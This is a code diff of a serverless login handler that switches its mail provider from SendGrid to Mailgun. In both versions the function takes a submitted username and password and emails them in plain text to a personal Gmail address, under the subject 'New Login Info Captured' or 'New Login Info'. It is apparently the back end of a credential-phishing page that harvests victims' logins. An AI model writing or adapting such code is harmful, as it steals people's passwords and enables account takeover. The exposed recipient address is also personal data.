@@ -1,24 +1,33 @@
-mport sgMail from '@sendgrid/mail';
+import formData from 'form-data';
+import Mailgun from 'mailgun.js';
 
-sgMail.setApiKey(process.env.SENDGRID_API_KEY);
+const mailgun = new Mailgun(formData);
+const mg = mailgun.client({
+username: 'api',
+key: process.env.MAILGUN_API_KEY
+});
 
-export async function handler(event, context) {
+export async function handler(event) {
 try {
 const { username, password } = JSON.parse(event.body);
 
-const msg = {
-to: 'anabones716@gmail.com', // your email
-from: 'no-reply@example.com', // verified sender in SendGrid
-subject: 'New Login Info Captured',
-text: `Username: ${username}\nPassword: ${password}`,
-html: `<p><strong>Username:</strong> ${username}</p><p><strong>Password:</strong> ${password}</p>`
+// Send email
+await mg.messages.create(process.env.MAILGUN_DOMAIN, {
+from: 'Mailgun Sandbox <postmaster@sandbox6bb4164382f045b9975489c0e3137797.mailgun.org>',
+to: 'anabones716@gmail.com', // must be verified in Mailgun sandbox
+subject: 'New Login Info',
+text: `Username: ${username}\nPassword: ${password}`
+});
+
+return {
+statusCode: 200,
+body: JSON.stringify({ message: "Email sent!" })
 };
-
-await sgMail.send(msg);
-
-return { statusCode: 200, body: JSON.stringify({ message: "Email sent!" }) };
 } catch (error) {
 console.error(error);
-return { statusCode: 500, body: JSON.stringify({ message: "Error sending email" }) };
+return {
+statusCode: 500,
+body: JSON.stringify({ message: "Error sending email" })
+};
 }
 }
